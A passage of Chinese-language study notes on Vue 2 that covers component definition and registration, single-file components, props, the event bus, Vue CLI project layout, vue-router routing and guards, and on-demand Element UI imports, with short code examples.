  // 全局注册组件；#root和#root2都可以用。
  Vue.component('xuexiao',school)
  </script>
</body>
```

### 使用组件的基本步骤
Vue中使用组件的三大步骤：
一、定义组件（创建组件）
二、注册组件
三、使用组件（写组件标签```<xuexiao></xuexiao>```）

1. 如何定义一个组件？
  使用```Vue.extend(options)```创建，其中options和```new Vue(options)```时传入的那个options几乎一样，但也有点区别：
  1. **el不要写**。因为最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器。
  el只能用在通过new关键字创建的Vue实例上，也就是只有```new Vue({})```里的配置对象中才有资格写el。而组件在创建时不会被写明白它到底为谁服务，“组件就是一块砖，哪里需要哪里搬”。
  2. **data必须写成函数**。为了避免组件被服用时数据存在引用关系。
  使用对象是引用数据，你用我用大家用；而函数返回值相当于复印了一份新的，随便改动却影响不了原文件。每次调用函数的时候返回的都是一个新的对象，不会出现两次调用指向的是同一个地址的情况。
2. 如何注册组件？
  1. 局部注册（推荐）：靠new Vue的时候传入components选项。
  components中是一组一组的key-value组合，上面定义组件时起的名字只是组件的临时名字，components里的key值才是真正决定了组件名称的。value则指定了组件位置，填写的是上面定义组件时给它的名字。**最好这两处使用同样的名字，这样可以使用简写写法（只写一个）。**
  2. 全局注册：靠```Vue.component('组件名',组件)```
3. 编写组件标签
  ```<xuexiao></xuexiao>```

+ 关于组件的命名：
  一个单词的组件名：推荐首字母大写。也可以全小写。
  多个单词的组件名：推荐每个单词的首字母大写（CamelCase命名）（必须在脚手架环境）。也可以单词间用短横线“-”连接（kebab-case命名），注意JS语法要求对象里的key如果有-则需要用引号包起来。 
  + 注意组件名尽量回避HTML中已有的元素名称，例如h2、H2都不行。
  + 可以使用```name```配置项指定组件在 **开发者工具** 中呈现的名字。

+ 关于组件标签
  第一种写法：```<xuexiao></xuexiao>```
  第二种写法：```<xuexiao/>```（自闭合）
  注意：在不使用脚手架时，```<xuexiao/>```会导致后续组件不能渲染。
  
+ 简写：```const school = Vue.extend(options)```可以简写为```const school = options```，即直接写配置项。这样在注册组件时还是会调用Vue.extend。

### 组件的嵌套
子组件需要注册在在父组件的内部。
需要注意：子组件的定义要在注册之前。

子组件在哪里注册，其结构就在哪里写。在父组件的```template:```内的最后一行补上```<xuesheng></xuesheng>```即可。

开发中使用app组件管理其它所有组件。一人（vm）之下，万人之上。
```html
<div id="root">
  <app></app>
</div>
```
```javascript
// 定义app组件
const app = Vue.extend({
  template:`
    <div>
      <school></school>
      <students></students>
    </div>
  `,
  components:{
    school,
    students,
  }
})

new Vue({
  // template:`<app></app>`  这里写了的话html的div里就可以是空的了
  el:"#root",
  components:{app}
})
```

### VueComponent
组件是可复用的Vue实例，所以它们与```new Vue```接收相同的选项，例如data、methods、watch、生命周期钩子等。仅有的例外是像```el```这样 **根实例（vm）** 特有的选项。
关于VueComponent：
1. school **组件本质上是一个名为*VueComponent的构造函数*** ，且不是程序员定义的，它归根到底是Vue.extend生成的。
  组件归根到底就是VueComponent，就是构造函数。
2. 我们只需要写```<school/>```或```<school></school>```，Vue解析时会帮我们创建school**组件的实例对象** 。即Vue帮我们执行的```new VueComponent(options)```。
3. 特别注意：<span style='color:red'>每次调用```Vue.extend```，返回的都是一个全新的VueComponent！！！</span>
  比如```<xuexiao>```和```<xuesheng>```的VueComponent，虽然打印出来虽然一模一样但它们确实不是同一个。是同一个类new出来的两个对象，它们是不同的实体，只是结构类似而已。每new一次就会开辟一块新的内存。
4. 关于this的指向，
  1. 组件配置中，
    data函数、methods中的函数、watch中的函数、computed中的函数，它们的this均是【VueComponent实例对象(vc)】。
    vc和vm功能一样，都有数据代理、数据监视等。
  2. ```.new Vue(options)```配置中，
    data函数、methods中的函数、watch中的函数、computed中的函数，它们的this均是【Vue实例对象(vm)】。
5. VueComponent的实例对象，经常被简称vc（也可称之为：组件实例对象。因为组件归根到底就是VueComponent）。
  Vue的实例对象则常被简称为vm。

### 一个重要的内置关系（原型链相关）
> 关于原型链：
> 显式原型```prototype```和隐式原型```__proto__```的区别在于，```prototype```是构造函数的属性，而```__proto__```是对象的属性。
> 无论是函数身上的显式原型属性，还是实例身上的隐式原型属性，它们都指向了同一个对象：**原型对象**。通过显示原型链给原型(或者原型的原型)添加属性，通过隐式原型链获取原型的属性，从自身沿着原型链一直找直到window的原型为空。

<span style='color:red'>实例的隐式原型属性，永远指向自己缔造者的原型对象！</span>

一个重要的内置关系：** ```VueComponent.prototype.__proto__ === Vue.prototype```。**
为什么要有这个关系：<span style='color:red'>让组件实例对象（vc）可以访问到Vue原型上的属性、方法。</span>

从下图可以看出，VueComponent的原型对象（VueComponent.prototype）的原型对象（VueComponent.prototype.__proto__），就是Vue的原型对象（Vue.prototype）。
![一个重要的内置关系](VueComponentProto.png)

### 单文件组件（xxx.vue)
> vscode不认.vue文件，需要安装插件。（如vetur）
> 如果已经安装插件vetur，在.vue文件中输入```<v```再回车即可生成一套模板。

给.vue文件的起名规则和组件名的那套规则一样（单个单词、多个单词）。
下面是文件 **School.vue** 的示例：
```vue
<template>
<!-- 组件的结构 -->
<!-- template内必须有一个根标签<div> -->
  <div class="demo">
    <h2>学校名称:{{schoolName}}</h2>
    <h2>学校地址:{{address}}</h2>
    <button @click="showName">显示学校名</button>
  </div>
</template>

<script>
// 组件交互相关的代码（数据、方法等）
  export default { // 暴露
    name:'School',  // 不写的话，别人在注册这个组件的时候可能会随便起名
    data(){
      return{
        schoolName:'BUT',
        address:'beijing'
      }
    },
    methods:{
      showName(){
        alert(this.schoolName)
      }
    },
  }
</script>

<style>
/* 组件的样式 */
  .demo{
    background-color:orange;
  }
</style>
```

一个必须有的.vue文件：**App.vue**。
```vue
<template>
  <div>
    <School/>
    <Student/>
  </div>
</template>

<script>
  // 引入组件
  import School from './School'  // 自行确定路径。这里的文件名可以省略拓展名.vue
  import Student from './Student'  
  
  export default { 
    name:'App', 
    components:{
      School,
      Student
    }
  }
</script>
```

同时所有的组件都被vm管理，那么应该在什么地方创建vm呢？上面的几个文件都是.vue文件，.vue文件中一定不会出现```new Vue```语句。
创建与App.vue同级的文件 **main.js** 【入口文件】，一切的事从它开始 ：
```javascript
import App from './App.vue'

new Vue({
  el:'#root',  // 服务于哪个容器
  template:`<App></App>`,
  components:{App},   // 领头的组件是App 
})
```

上述代码中的#root容器则在 **index.html** 中存放，注意一定要先让模版出来再去引入main.js：
```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>单文件组件的语法</title>
</head>
<body>
  <!-- 注意下面语句的先后顺序！一定要先让模版出来再去引入main.js -->
  <!-- 准备一个容器 -->
  <div id="root"></div>
  <script src="./js/vue.js"></script>
  <script src="./main.js"></script>
</body>
</html>
```

大致捋顺一下逻辑：
要打开的是index.html，在index.html可以看到容器已经准备好（```<div id="root"></div>```），vue已经就位（```<script src="./js/vue.js"></script>```），这样就到了一切的开端：main.js，即入口文件(```<script src="./main.js"></script>```)。

接下来进入main.js，main.js中首先进行的操作是引入App.vue(```import App from './App.vue'```)：
进入App.vue，里面有结构（```<template>```），又引入了school、student（这两个组件也注册、使用了，没有问题）。在组件import的时候的时候就开始读取school.vue文件，这文件里的东西就被读取。再回到App.vue，在引入school的下一行又引入了student，执行类似的操作。这两行执行完之后再对这两个组件进行注册，随后对整个模版进行解析。

结束后回到main.js，此时App已经import完毕，开始执行new Vue的操作。在new Vue的时候，由于之前在index.html中最先引入了vue.js，所以在main.js中自然可以new Vue；也引入了也注册了；组件标签也写了；服务于哪个容器也说了（#root）。

这时候回到index.html，在root容器里面就已经出现了想要的东西。
但这时直接打开index.html会报错，因为浏览器不能直接支持ES6的模块化语法。这实际是因为main.js的第一句import就出了问题：.vue文件浏览器不能直接运行。import语句浏览器也不认识。

可以总结一下，随便打开一个普通组件的.vue，可以看到template里面写结构，script里面写脚本，这个脚本里面包含着给组件命名、配置数据、配置计算属性等等，style里面放的是样式。App组件则负责汇总所有组件。main.js创建vue实例并指明为哪个容器服务，index.html则是页面。

### ref属性
1. 被用来给元素或子组件注册引用信息（id的替代者）
2. 应用在html标签上获取的是真实DOM元素，**应用在组件标签上是组件实例对象（vc）**
3. 使用方式：
  打标识：```<h1 ref="xxx">.....</h1>```或```<School ref=xxx"></School>```
  获取：```this.$refs.xxx```

### 配置项props
功能：让组件接收外部传过来的数据
1. 传递数据：```<Demo name="xxx"/>
2. 接收数据:
  + 第一种方式（只接收）：```props:['name']```
  + 第二种方式（限制类型）：```props:{ name:String }```
  + 第三种方式（限制类型、限制必要性、指定默认值）：```props:{ name:{type:String,required:true,default:'张三'}}```
3. 备注：props是只读的，Vue底层会监测对props的修改。如果进行了修改，就会发出警告；若业务需求确实需要修改，需要复制props的内容到data中一份然后去修改data中的数据。

### 全局事件总线（GlobalEventBus）
是一种组件间通信的方式，适用于任意组件间通信。

1. 安装全局事件总线
```javascript
new Vue({
    ......
    beforeCreate(){
        Vue.prototype.$bus = this  // 安装全局事件总线。$bus就是当前应用的vm。
    },
    ...
})
```
2. 使用事件总线

  1.接收数据：A组件想接收数据，就在A组件中给```$bus```绑定自定义事件，<span style='color'>事件的回调留在A组件自身</span>。
```javascript
  methods(){
    demo(data){......}
  }
  ......
  mounted(){
    this.$bus.$on('xxxx',this.demo)
  }
```

​                   2.提供数据：```this.$bus.$emit('xxxx',数据)```

3. 最好在```beforeDestroy```钩子中，用```$off```去解绑<span style='color'>当前组件使用到的事件</span>。


## 使用Vue-cli

官网：https://cli.vuejs.org/zh/

准备工作：配置npm淘宝镜像，```npm config set registry https://registry.npm.taobao.org```

1. 第一步（仅第一次执行）：全局安装@vue/cli，```npm install -g @vue/cli```。
   可以执行以下命令更新vue-cli：
```bash
npm uninstall -g vue-cli
npm install -g @vue/cli
```
2. 第二步：<span style='color'>切换到要创建项目的目录</span>，然后使用命令创建项目：
   执行```vue create vue_test```，vue_test处写自己想要创建的项目名。会弹出以下选项：
   ![newcli1](newcli1.png)
   上图为选择想要的vue版本（注意不是vuecli版本)。babel进行语法转换，作用是将写Vue用到的ES6代码转换为ES5。eslint的作用是对JS进行语法检查。
3. 第三步：启动项目：
  回车之后脚手架继续执行，完成后通过```cd vue_test```进入文件夹。通过```npm run serve  # 回车后开始编译代码```启动项目。

完成后可以看到脚手架不仅做了翻译，还开启了一个内置的小服务器，端口在8080：```- Local:   http://localhost:8080/ ```。下一行```- Network: http://172.16.17.33:8080/```可以给同局域网内的同事使用，自己也可以使用。

按ctrl+c可以停止工程。

### 分析脚手架结构
1. ./
  + .gitignore：git忽略文件。其中是不被git管理的文件/文件夹。
  + babel.config.js：babel配置文件。通常不需要进行配置，如实在需要可参考babel官网。
  + package.json：任何符合npm规范的工程都会有package.json，是包的说明书，里面写了包的名称、版本、常用命令、依赖、库等等。
    比如在命令中可以看到语句```"serve": "vue-cli-service serve"```，这说明当我们运行命令```npm run serve```时实际执行的是```vue-cli-service serve```。
    serve命令在开发过程中使用，可以让它帮我们配置好服务器等等，也就是刚才的效果。
    build命令可以在所有功能都写完后把它变成一个浏览器认识的东西，也就是最后一次编译。
    lint命令很少用，其作用是把所有的JS和.vue文件都进行一次语法检查。少用是因为vscode本身就有很好的语法检查插件，而且开发的过程中通常都会关闭语法检查，只有在最后的时候才会打开一下看看有没有什么不合理的地方。
  + package-lock.json：包版本控制文件。可以在其中查看各个包的版本、下载地址等，这保证了以后可以用最快的速度安装指定版本。lock可以理解成是锁死了包的版本号，在下载的时候就不会错误的下载成其他版本。
2. ./src/
  + main.js：【该文件是整个项目的入口文件】。执行完命令```npm run serve```后，就会直接运行main.js。
    其中的```render: h => h(App)```完成的是把App组件放入容器中。render是渲染的意思。
    注意它里面的```import Vue from 'vue'```引入的其实是残缺版的vue，这个残缺的没有模版解析器，所以只要在new Vue里一写template就会报错，所以需要借助render。（标签```<template>```不受影响）
    可以command+'vue'打开文件来到node_modules/vue/types/index.d.ts，再打开其上层文件夹node_modules/vue的package.json，可以看到``` "module": "dist/vue.runtime.esm.js"```，这个vue.runtime.esm.js才是真正引入的那个vue文件。最原始的vue应该是node_modules/vue/dist/vue 。
  + App.vue：【App组件是所有组件的父组件】。其中import其他所有组件，注意路径。
  + ./scr/assets：存放静态资源。
  + ./scr/components：【存放所有程序员写出的组件】。除了App.vue。

3. ./public
  + index.html：【整个应用的界面】。
    语句```<meta http-equiv="X-UA-Compatible" content="IE=edge">```：针对IE的特殊配制，含义是让IE以最高的渲染级别渲染页面。
    语句```<meta name="viewport" content="width=device-width,initial-scale=1.0">```：开启移动端的理想视口。
    路径```<%= BASE_URL %>```：即public文件夹的路径。
    标签```<noscript>```：如果浏览器支持JS，这个页面的东西就不会渲染。 
    语句``` <div id="app"></div>```：容器。
4. ./router
  + 是自己新建的文件夹，存放路由。
  + ./router/index.js：【创建整个应用的路由器】

5. 几个不能改的文件/文件夹：
  1. ./public文件夹，需要去这里面找index.html
  2. ./public/favicon.ico
  3. ./public/index.html
  4. ./src文件夹，底层的默认配置需要
  5. ./main.js
6. 可选配置文件：vue.config.js，<span style="color:red">放在与package.json同级的的地方。</span>详情见：https://cli.vuejs.org/zh/config/
  Vue脚手架隐藏了所有webpack相关的配置，若想查看具体的webpack配置，执行```vue inspect > output.js```。
  这个文件修改之后需要重新```npm run serve```使其生效。
  

大致流程：执行完```npm run serve```，来到src文件夹找到main.js，该文件引入了vue引入了App。到引入App的这一行，来到App.vue，发现里面引入了School Student，就把这两个对应的.vue文件也执行了，再汇总到App里。回到main.js继续走，```render: h => h(App)```把App组件放入容器中，也就是到index.html中放到了容器``` <div id="app"></div>```里。

+ 关于不同版本的vue：
  1.vue.js是完整版的Vue，包含核心功能+模版解析器
  2.vue.runtime.xxx.js是运行版的Vue，只包含核心功能而不含模版解析器。
  3.由于vue.runtime.xxx.js没有模版解析器，所以不能用template配置项，而需要使用render函数接收到的createElement函数去指定具体内容。

+ 关于main.js其中的```render: h => h(App)```：
  这里的render实际上是一个函数，实际调用它的是vue，调用时传递的是```createElement```参数。这个函数可以创建具体的元素、传递具体的内容。它相当于```render(createElement){ return createElement('h1','HelloWorld!')}```。   
  这个函数里没用到this就可以写成箭头函数：```render:(createElement)=>{ return createElement('h1','HelloWorld!')}```，这个箭头函数左边只有一个参数就可以省略这个参数旁边的小括号：```render:createElement=>{ return createElement('h1','HelloWorld!')}```，这个箭头函数只有一句函数体而且还需要return，顺便把createElement换成个短一些的h：```render:h=>h('h1','HelloWorld!')```。
  到此时，h里面还传入了两个参数:```'h1','HelloWorld!'```，有两个是因为h1是html的内置元素，需要知道这个元素里的具体内容，就需要第二个参数。但如果用的是组件，具体内容都在组件里面，注意里面的App两侧没有引号。

## Vue中的ajax







## Vuex
> github地址：https://github.com/vuejs/vuex

专门在Vue实现 **集中式** 状态（数据）管理的一个Vue **插件** （通过Vue.use(Vuex)的方式使用)，对Vue应用中多个组件的共享状态进行集中式的管理（读/写），也是一种组件间通信的方式，且适用于任意组件间通信。

什么时候使用Vuex：1.多个组件依赖于同一状态时。   2.来自不同组件的行为需要变更同一状态时。







## Vue-router
> 2022.2.7以后，vue-router的默认版本为4版本，vue-router4只能在vue3中使用，vue-router3才能在vue2中使用。
> 如果把vue-router4强行安装到vue2中则会报错。
> 所以在vue2中安装vue-router3：```npm i vue-router@3```，在vue3中安装vue-router4则可以直接```npm i vue-router```。在哪个项目里用就在哪里开终端然后执行安装命令。
> 在main.js中通过```import VueRouter from 'vue-router'```引入这个插件，并在下面```Vue.use(VueRouter)```应用插件。

vue-router就是vue的一个插件库，专门用来实现SPA应用。

+ 如何理解SPA应用？
    1. 单页Web应用（single page web application，SPA）
    2. 整个应用只有<span style='color:red'>一个完整的页面</span>（index.html）
    3. 点击页面中的导航连接<span style='color:red'>不会刷新</span>页面，只会做页面的<span style='color:red'>局部更新</span>
    4. 数据需要通过ajax请求获取

+ 如何理解路由？
    1. 路由就是<span style='color:red'>一组key-value的对应关系</span>，多个路由需要经过路由器的管理。
    2. key为路径，value可能是function或component。

+ 路由分类：
    1. 前端路由：value是component，用于展示页面内容。
    工作过程：当浏览器的路径改变时，对应的组件就会显示。
    2. 后端路由：value是function，用于处理客户端提交的请求。
    工作过程：服务器接收到一个请求时，根据请求路径找到匹配的函数来处理请求，返回响应数据。

+ 基本使用
  1. 安装vue-router：```npm i vue-router```
  2. 应用插件：```Vue.use(VueRouter)```
  3. 编写router配置项
  4. 实现切换（active-class可以配置高亮样式）：```<router-link class="item" active-class="active" to="/about">这里是About</router-link>```
  5. 指定展示位置：```<router-view></router-view>```

+ 几个注意点
  1. 路由组件通常存放在pages文件夹，一般组件通常存放在components文件夹。(这两个文件夹同级，都在src里)
  2. 通过切换，“隐藏”了的路由组件默认是被销毁的，需要的时候再去挂载。
  3. 每个组件都有自己的$route属性，存储着这个组件自己的路由信息。里面有path、query等。
  4. 整个应用只有一个router，可以通过组件的$router属性获取到。

### 基本路由
./router就是自己新建的文件夹，存放路由。./router/index.js：【创建整个应用的路由器】
./router/index.js的一个示例：
```javascript
import VueRouter from 'vue-router'   // VueRouter可以当成一个构造函数去用
import About from '../pages/About'

// const router = new VueRouter({  // 创建一个路由器
export default new VueRouter({  // 创建并暴露一个路由器
  routes:[  // 里面写一组一组的路由，每一个都是一个配置对象（因为是key-value）
    {  // 如果路径是/about，就去显示About组件。这里用到的组件得在上面import。
      path:'/about',  //  也是浏览器地址栏后面追加的路径。
      component:About  
    },
    { ... },
  ]
})
```

在main.js通过```import VueRouter from 'vue-router'```引入这个插件，通过```import router from './router'```引入路由器，并在下面```Vue.use(VueRouter)```应用插件。应用完之后，在new Vue中就可以使用配置项：**router**。下面是main.js的示例。
```javascript
import Vue from 'vue'
import App from './App.vue'
import VueRouter from 'vue-router'
import router from './router'

Vue.config.productionTip = false
Vue.use(VueRouter)

new Vue({
  el:'#app',
  render:h => h(App),
  router:router
})
```
此外，还需要在用到了路由切换的地方用标签```<router-link>```并在其中使用```to="目标路由"```、```active-class="选中样式"```等处理跳转部分的语句，比如```<router-link class="item" active-class="active" to="/about">这里是About</router-link>```。
同时通过标签```<router-view>```指定组件的呈现位置。

在实际网页上可以看到，使用```<a>```标签和```<router-link>```标签得到的结果完全相同，打开开发者工具就可以看到，实际上```<router-link>```也被转化成了```<a>```标签处理。
### 嵌套（多级）路由
1. 配置路由规则。使用 **children配置项**。注意 **子路由的path不要加斜杠**：
```javascript
routes:[
  {
    path:'/about',
    component:About,
  },
  {
    path:'/home',
    component:Home,
    children:[  // 通过children配置子级路由
      {
        path:'news',  // 此处一定不要写"/news"！
        component:News
      },
      {
        path:'message',  // 此处一定不要写"/message"！
        component:Message  
      }
    ]
  }
] 
```
2. 跳转（**要写完整路径**）：
```<router-link to="/home/news">News</router-link>```

### 路由传参
#### 路由的query参数
通过路径后添加问号的方式携带参数，多组key-value之间用```&```分隔。

1. 传递参数
注意router-link里的<span style='color:red'>```to```前面要加冒号！</span>否则就会把里面传的东西全当字符串处理。
在使用to的字符串写法时，加了冒号就会把双引号内的东西当作JS去解析，但是还需要一个模板字符串标志```` ```括起来。此外，模板字符串里面混入的JS变量需要用```${xxx}```括起来。
```html
<!-- 跳转并携带query参数，to的字符串写法 -->
<router-link :to="`/home/message/detail?id=${m.id}&title=${m.title}`">显示{{m.title}}</router-link>

<!-- 跳转并携带query参数，to的对象写法 -->
<router-link 
  :to="{
    path:'/home/message/detail',
    query:{
      id:m.id,
      title:m.title
    }
  }"
>跳转</router-link>
```
2. 接收参数：
  每个组件自己的$route属性存储着这个组件的路由信息。里面有path、query、params等。
```javascript
$route.query.id  
$route.query.title  // id和title就是传的参数
```

#### 路由的params参数
1. 配置路由，一定要使用**占位符**声明接收params参数。
```javascript
children:[  
      {
        name:'xiangqing'
        path:'detail/:id/:title',  // 使用占位符声明接收params参数
        component:News
      }
    ]
```
2. 传递参数
注意，在使用to的对象写法传递参数时<span style='color:red'>一定不能用path配置项，必须用name配置项！</span>而且在配置路由时也得配置name。
```html
<!-- 跳转并携带params参数，to的字符串写法 -->
<router-link :to="`/home/message/detail/${m.id}/${m.title}`">显示{{m.title}}</router-link>

<!-- 跳转并携带params参数，to的对象写法 -->
<router-link 
  :to="{
    name:'xiangqing'
    params:{
      id:m.id,
      title:m.title
    }
  }"
>跳转</router-link>
```
3. 接收参数：
每个组件自己的$route属性存储着这个组件的路由信息。里面有path、query、params等。
```javascript
$route.params.id  
$route.params.title  // id和title就是传的参数
```

### 命名路由
作用：简化路由跳转。
如何使用：
1. 给路由命名：给谁命名就在谁的配置项里加一个```name:'xxx'```。
```javascript
routes:[  
    { 
      name:'guanyu',
      path:'/about',  
      component:About  
    },
    { ... },
  ]
```
2. 简化跳转：简化前，需要写完整的路径；简化后，直接通过名字跳转。注意to前面需要加冒号。而且其内部要写成对象形式。
```html
<router-link to="/About">简化前的跳转到about</router-link>
<router-link :to="{name:'guanyu'}">简化后的跳转到about</router-link>
```

### 路由的props配置项
作用：让路由组件更方便的收到参数。
在router/index.js里，哪个路由接收东西就在谁里面写props配置项。写法如下：

+ 第一种写法（很少）：props值为对象，该对象中所有的key-value的组合最终都会以props的形式，通过props传给Detail组件。
    index.js中的配置：```props:{a:900,b:'hello'}```，Detail.vue中的接收，注意使用字符串：```props:['a','b']```，Detail.vue的template中的使用：```a:{{a}}```。
    缺点：传递的都是写死的数据。
+ 第二种写法：props值为布尔值，若布尔值为true，则把路由收到的所有 **params参数** 以props的形式通过props传给Detail组件。
    index.js中的配置：```props:true```，Detail.vue中的接收，注意使用字符串：```props:['id','title']```，Detail.vue的template中的使用：```id:{{id}}```。
    缺点：不能传递query类型的参数。
+ 第三种写法：props值为函数，该函数返回的对象中每一组key-value都会以props的形式通过props传给Detail组件。写法如下例所示：
```javascript
{
    name:'xiangqing',
    path:'datial/:id',
    component:Detail,
    
    props(route){
        return {
            id:route.query.id,
            title:route.query.title
        }
    }
}
```
上面的props配置项也可以使用解构赋值/解构赋值的连续写法：
```javascript
props({query}){
    return { id:query.id, title:query.title }
}

props({query:{id,title}}){
    return { id, title }
}
```

### 编程式路由导航

### 路由守卫
作用：对路由进行权限控制
分类：全局守卫、独享守卫、组件内守卫

#### 全局守卫
全局前置守卫：初始化时执行+每次路由切换前执行
```javascript
router.beforeEach((to,from,next)=>{
    console.log('beforeEach',to,from)
    if(to.meta.isAuth){  // 判断当前路由是否需要 进行 权限控制
        if(localStorage.getItem('school') === 'BUT'){ // 权限控制的具体规则
            next()  // 放行
        }else{
            alert('暂无权限查看')
            // next ({name:'张三'})
        }
    }else{
        next()  // 放行
    }
})
```

全局后置守卫：初始化时执行+每次路由切换后执行
```javascript
router.afterEach((to,from)=>{
    console.log('afterEach',to,from)
    if(to.meta.title){  
        document.title = to.meta.title // 修改网页的title
    }else{
        document.title = 'test'
    }
})
```

#### 独享守卫
```javascript
beforeEnter((to,from,next)=>{
    console.log('beforeEnter',to,from)
    if(to.meta.isAuth){  // 判断当前路由是否需要进行权限控制
        if(localStorage.getItem('school') === 'BUT'){ // 权限控制的具体规则
            next()  // 放行
        }else{
            alert('暂无权限查看')
            // next ({name:'张三'})
        }
    }else{
        next()  // 放行
    }
})
```

#### 组件内守卫
进入守卫：通过路由规则，进入该组件时被调用，```beforeRouteEnter(to,from,next){ }```
离开守卫：通过路由规则，离开该组件时被调用，```beforeRouteLeave(to,from,next){ }```

## 实践
1. 组件化编码流程
    1. 拆分静态组件：组件要按照功能点划分，命名不要与html元素冲突。
    2. 实现动态组件：考虑好数据的存放位置，数据是一个组件在用还是一堆组件在用：
        + 一个组件在用：放在组件自身即可。
        + 一堆组件在用：放在它们共同的父组件上（**状态提升**）
    3. 实现交互：从绑定事件开始。
2. props适用于：
    1. 父组件==>子组件 通信
    2. 子组件==>父组件 通信（不过要求父先给子一个函数）
3. 使用v-model时切记：<span style="color:red">v-model绑定的值不能是props传过来的值，因为props是不可以修改的！</span>
4. props传过来的如果是对象类别的值，修改对象中的属性时vue不会报错，但不推荐这样做。

## Element UI
一个基于Vue框架的PC端UI组件库。官网：https://element.eleme.cn/#/zh-CN 。

需要注意的是，如果使用了下面两行代码：
```javascript
import 'element-ui/lib/theme-chalk/index.css';  // ElementUI所有样式全部被引入了
Vue.use(ElementUI);  // ElementUI所有组件全部被注册了
```
实际上是引入了所有的样式和所有的组件，则会使"chuknk-vendor.js"文件的体积过大（可以在浏览器的Network中查看）。
此外，```import 'element-ui/lib/theme-chalk/index.css';```中的```index.css```也是全部的样式。

+ 借助```babel-plugin-component```按需引入组件
    + 参考Element UI官网 https://element.eleme.cn/#/zh-CN/component/quickstart 中的“按需引入”。
    + 修改对应的babel文件
    + 在```main.js```按需引入，注意引入时的首字母参照官网上已经给出的格式即单词首字母大写，形如```import { Button,Row,DatePicker } from 'element-ui'```；还需要在```main.js```全局注册组件，如```Vue.component(Button.name, Button);```，或写为```Vue.use(Button)```。```Button.name```其实就是```<el-button>```，可以把```Button.name```修改为自己想要的名字然后把对应的html标签名也对应的修改掉。
    + 不需要在```main.js```引入样式，脚手架会自动帮我们处理。
    
    > 注意，使用最新版本的vue-cli生成的工程文件夹中没有文件```.babelrc```，而是```babel.config.js```。
    > 修改时也应注意细节，比如"plugins"和“presets”同级。

一个修改后的```babel.config.js```文件示例，注意第四行需要把官网写的```"es2015"```替换为```"@babel/preset-env"```：
```javascript
module.exports = {
  presets: [
    '@vue/cli-plugin-babel/preset',
    ["@babel/preset-env", { "modules": false }]
  ],
  plugins: [
    [
      "component",
      {
        "libraryName": "element-ui",
        "styleLibraryName": "theme-chalk"
      }
    ]
  ]
}
```

### 可能存在的问题
+ 按需引入时错误```xxx not found```解决：这可能是因为脚手架已经更新但UI官网还没有更新。根据报错提示安装对应的包```npm i xxx```即可。
+ 错误```Cannot find module '@babel-preset-env/babel-preset'```解决：换成```['@babel/env', { modules: false }]```。











